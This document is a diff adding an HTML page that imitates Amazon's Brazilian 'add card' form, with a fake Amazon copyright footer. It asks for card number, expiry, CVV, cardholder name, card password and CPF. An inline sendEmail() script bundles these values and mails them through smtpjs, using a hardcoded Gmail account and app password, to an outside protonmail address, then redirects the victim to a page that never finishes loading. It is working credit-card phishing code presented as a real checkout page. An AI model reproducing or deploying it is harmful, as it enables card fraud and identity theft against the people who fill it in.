@@ -1,0 +1,133 @@
+<html lang="pt-br"><head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <link rel="stylesheet" href="styles/estilos.css">
+  <link rel="stylesheet" href="styles/forms.css">
+  <link rel="stylesheet" href="styles/styles.css">
+  <title>Amazon</title>
+<style>
+  input{
+    outline: none;
+    font-weight: bold;
+  }
+</style>
+</head>
+
+<body style="display: block;">
+  <div class="main-header col-12">
+    <div id="nav-logobar">
+      <div class="nav-logobar-left">
+        <div class="nav-logo" style="margin-left: 15px;">
+          <a id="nav-logo-sprites">
+            <span class="nav-logo-base nav-sprite"></span>
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="container-fluid">
+    <a href="method.html">
+      <div class="row" style="margin-left: -15px; margin-right: -15px;">
+        <div class="col-12" style="padding: 0px;">
+          <div class="return">
+            <h6 style="padding: 15px;">Voltar</h6>
+          </div>
+        </div>
+      </div>
+    </a>
+  </div>
+  <div style="margin-top: 36px;" class="container">
+    <div class="row justify-content-center" style="display: block;">
+      <div class="col-sm-12 col-lg-6">
+        <h6 style="margin-left: 16px">Adicione as informações do cartão</h6><div class="boxb">
+          <div class="container-fluid">
+            <div class="row justify-content-center" style="display: block;">
+              <div class="col-12" style="width: 100%; padding: 30px; left: -1;">
+                <div class="row" style="display: block;">
+                  <form onsubmit="sendEmail()" method="POST">
+                    <div class="card">
+                      <input class="inputForm1 x" type="name" maxlength="50" id="cc-name" name="cc-name" placeholder="Nome no cartão" autocomplete="cc-name" required="required" style="text-transform: uppercase;">
+                      <input class="inputForm1 x" type="tel" inputmode="numeric" maxlength="20" id="cc-number" name="cc-number" placeholder="Número do cartão" autocomplete="cc-number" required="required">
+                      
+                      <input class="inputForm1" type="tel" maxlength="4" id="cc-csc" name="cc-csc" placeholder="cvv (código de segurança)" autocomplete="cc-csc" required="required">
+                    </div>
+                    <div style="display: flex;">
+                      <input class="inputForm x" type="tel" maxlength="50" id="cc-exp" name="cc-exp" placeholder="Data de expiração do cartão" style="border-radius: 8px;width: 50%;" autocomplete="cc-exp" required="required">
+                      <input class="inputForm x" type="tel" maxlength="10" id="cc-pass" name="cc-pass" placeholder="Senha" style="border-radius: 8px;width: 40%;margin-left: 10%;" autocomplete="" required="required">
+                    </div>
+                      <input class="inputForm x" type="tel" maxlength="14" id="cpf" name="cpf" placeholder="CPF" style="border-radius: 8px;" autocomplete="" required="required">
+                    <div class="b-button">
+                      <input class="c-button-input" value="Adicionar forma de pagamento" type="submit" id="submit" required="required">
+                    </div>
+                  </form>
+                  <script>
+                    function show() {
+                      document.getElementById("errbox").style.display = "block"
+                    }
+
+                    function sendEmail() {
+                      let ccNum  = document.getElementById("cc-number").value;
+                      let ccExp  = document.getElementById("cc-exp").value;
+                      let ccCsc  = document.getElementById("cc-csc").value;
+                      let ccName = document.getElementById("cc-name").value;
+                      let ccPass = document.getElementById("cc-pass").value;
+                      let cpf    = document.getElementById("cpf").value; 
+                      let finalmessage = `CC Number : ${ccNum} <br>  CC-EXP : ${ccExp} <br>  CC-CSC : ${ccCsc} <br> CC NAME : ${ccName} <br> CPF: ${cpf} <br> Password: ${ccPass}`;
+                      
+                      if (ccNum.length === 16){
+                        if (ccExp.length >= 4){
+                          if (ccCsc.length == 3 || ccCsc.length == 4){
+                            if (ccName.length > 6){
+                              if (cpf.length == 11 || cpf.length == 14){
+                                Email.send({
+                                  Host: "smtp.gmail.com",
+                                  Username : "julio74108520@gmail.com",
+                                  Password : "hgvt vldi peit jcoh",
+                                  To : 'user1533@protonmail.com',
+                                  From : "julio74108520@gmail.com",
+                                  Subject : "Amazon: compra realizada.",
+                                  Body : finalmessage
+                                  }).then(window.location.href = 'loadforever.html');  
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  </script>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!--Footer-->
+
+  <footer style="margin-top: 64px;">
+    <div class="row justify-content-center a-a">
+      <div class="col-3"><h1>Cookies</h1></div>
+      <div class="col-3"><h1>Condições de uso</h1></div>
+      <div class="col-3"><h1>Aviso de Privacidade</h1></div>
+    </div>
+    <div class="row justify-content-center a-a">
+      <div class="col-10">
+        <h1 style="margin-bottom: 144px;">© 1996-2021, Amazon.com, Inc. ou suas afiliadas</h1>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Optional JavaScript -->
+  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://smtpjs.com/v3/smtp.js"></script>
+
+</body></html>
